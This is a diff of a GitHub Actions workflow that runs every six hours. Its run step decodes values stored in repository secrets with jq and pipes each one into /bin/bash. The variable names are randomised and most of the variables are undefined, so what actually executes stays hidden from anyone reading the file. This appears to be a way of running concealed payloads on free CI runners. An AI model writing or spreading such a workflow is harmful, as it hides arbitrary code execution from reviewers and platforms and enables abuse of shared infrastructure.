@@ -1,25 +1,21 @@
 name: chenyangmu4879
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 5/6 * * *'
+    - cron: '48 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chenyangmu4879
         env:
-          bi775: ${{ secrets.bi775 }}
+          vy315: ${{ secrets.vy315 }}
         run: |
-          echo $bi775 | jq -r .ls11179 | /bin/bash
-          echo $knr081 | jq -r .lny06493 | /bin/bash
-          echo $mchkq5 | jq -r .tkiet04836 | /bin/bash
-          echo $qac65508 | jq -r .bf680 | /bin/bash
-          echo $k189 | jq -r .rnn98489 | /bin/bash
-          echo $yqgis348 | jq -r .v841 | /bin/bash
-          echo $ja0107 | jq -r .fbcd62256 | /bin/bash
-          echo $exfht33253 | jq -r .z86586 | /bin/bash
-          echo $olds6212 | jq -r .cnj59242 | /bin/bash
+          echo $vy315 | jq -r .mjmx2 | /bin/bash
+          echo $ghlej510 | jq -r .dn32030 | /bin/bash
+          echo $l2 | jq -r .y07 | /bin/bash
+          echo $o1 | jq -r .deas80736 | /bin/bash
+          echo $dgo9 | jq -r .ver1077 | /bin/bash
 
